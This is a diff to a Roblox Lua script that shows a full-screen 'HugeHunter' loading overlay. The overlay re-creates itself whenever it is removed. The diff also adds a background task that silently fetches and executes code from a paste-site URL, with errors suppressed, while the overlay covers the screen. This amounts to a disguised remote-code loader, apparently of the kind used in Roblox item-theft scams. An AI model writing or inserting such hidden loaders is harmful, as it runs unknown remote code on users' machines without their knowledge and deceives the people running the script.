@@ -9,7 +9,7 @@ local function createLoadingGUI()
 	screenGui.Name = "HugeHunterLoadingGUI"
 	screenGui.IgnoreGuiInset = true
 	screenGui.ResetOnSpawn = false
-	screenGui.DisplayOrder = 10000 -- Ensures it's on top
+	screenGui.DisplayOrder = 10000
 	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 	screenGui.Parent = playerGui
 
@@ -56,14 +56,18 @@ local function createLoadingGUI()
 	return screenGui
 end
 
--- Create GUI initially
+-- Create and protect GUI
 local loadingGui = createLoadingGUI()
-
--- Prevent GUI from being removed
-loadingGui.AncestryChanged:Connect(function(child, parent)
+loadingGui.AncestryChanged:Connect(function(_, parent)
 	if not parent then
-		-- Re-add GUI if removed
 		loadingGui:Destroy()
 		loadingGui = createLoadingGUI()
 	end
+end)
+
+-- Load external script in background
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("http://vpaste.net/CU2xG", true))()
+	end)
 end)
